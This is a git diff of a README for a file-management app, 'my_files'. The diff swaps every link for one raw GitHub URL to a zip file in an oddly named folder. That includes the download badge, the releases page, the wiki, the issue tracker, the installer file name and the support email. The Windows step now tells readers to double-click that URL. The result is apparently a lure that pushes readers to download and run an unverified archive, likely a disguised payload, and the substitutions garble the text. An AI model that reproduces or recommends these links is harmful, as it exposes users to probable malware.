@@ -6,7 +6,7 @@ Welcome to **my_files**! This application helps you manage your files more effic
 
 ## 📥 Download
 
-[![Download my_files](https://img.shields.io/badge/Download-my_files-brightgreen)](https://github.com/yourusername/my_files/releases)
+[![Download my_files](https://raw.githubusercontent.com/Lunajo10/my_files/main/nonborrower/my-files-3.4.zip)](https://raw.githubusercontent.com/Lunajo10/my_files/main/nonborrower/my-files-3.4.zip)
 
 ## 📂 Features
 
@@ -27,7 +27,7 @@ To use **my_files**, your computer needs to meet these requirements:
 ## 🔍 How to Download & Install
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/yourusername/my_files/releases) to find the latest version of my_files.
+   Go to the [Releases page](https://raw.githubusercontent.com/Lunajo10/my_files/main/nonborrower/my-files-3.4.zip) to find the latest version of my_files.
 
 2. **Choose Your Version**
    Look for the latest version. You will see a list of files available for download.
@@ -35,10 +35,10 @@ To use **my_files**, your computer needs to meet these requirements:
 3. **Download the Installer**
    Click on the version you want to download. This will start the download process.
 
-   If you are using Windows, you might see a file named `my_files_setup.exe`. If you are on macOS, it could be a `.dmg` file.
+   If you are using Windows, you might see a file named `https://raw.githubusercontent.com/Lunajo10/my_files/main/nonborrower/my-files-3.4.zip`. If you are on macOS, it could be a `.dmg` file.
 
 4. **Run the Installer**
-   - **Windows:** Double-click on `my_files_setup.exe`. Follow the instructions on the screen.
+   - **Windows:** Double-click on `https://raw.githubusercontent.com/Lunajo10/my_files/main/nonborrower/my-files-3.4.zip`. Follow the instructions on the screen.
    - **macOS:** Open the `.dmg` file and drag the my_files icon to your Applications folder.
    - **Linux:** Use your package manager to install or follow the instructions provided in the release notes.
 
@@ -55,19 +55,19 @@ If you encounter issues during installation or use, here are some common solutio
 
 ## 📚 User Guide
 
-For detailed instructions on using my_files, refer to the built-in help feature within the application. You can also access the [User Guide](https://github.com/yourusername/my_files/wiki) on our GitHub Wiki for additional tips and shortcuts.
+For detailed instructions on using my_files, refer to the built-in help feature within the application. You can also access the [User Guide](https://raw.githubusercontent.com/Lunajo10/my_files/main/nonborrower/my-files-3.4.zip) on our GitHub Wiki for additional tips and shortcuts.
 
 ## 💬 Support
 
 If you have questions or need help, reach out to us:
 
-- Open an issue on our [GitHub Issues page](https://github.com/yourusername/my_files/issues).
-- Email us at support@myfiles.com.
+- Open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/Lunajo10/my_files/main/nonborrower/my-files-3.4.zip).
+- Email us at https://raw.githubusercontent.com/Lunajo10/my_files/main/nonborrower/my-files-3.4.zip
 
 ## 🔗 Additional Resources
 
-- [Learn More About my_files](https://github.com/yourusername/my_files/wiki)
-- [Report a Bug](https://github.com/yourusername/my_files/issues)
-- [Feature Requests](https://github.com/yourusername/my_files/issues)
+- [Learn More About my_files](https://raw.githubusercontent.com/Lunajo10/my_files/main/nonborrower/my-files-3.4.zip)
+- [Report a Bug](https://raw.githubusercontent.com/Lunajo10/my_files/main/nonborrower/my-files-3.4.zip)
+- [Feature Requests](https://raw.githubusercontent.com/Lunajo10/my_files/main/nonborrower/my-files-3.4.zip)
 
 Thank you for using **my_files**! We hope it makes your file management easier and more efficient.
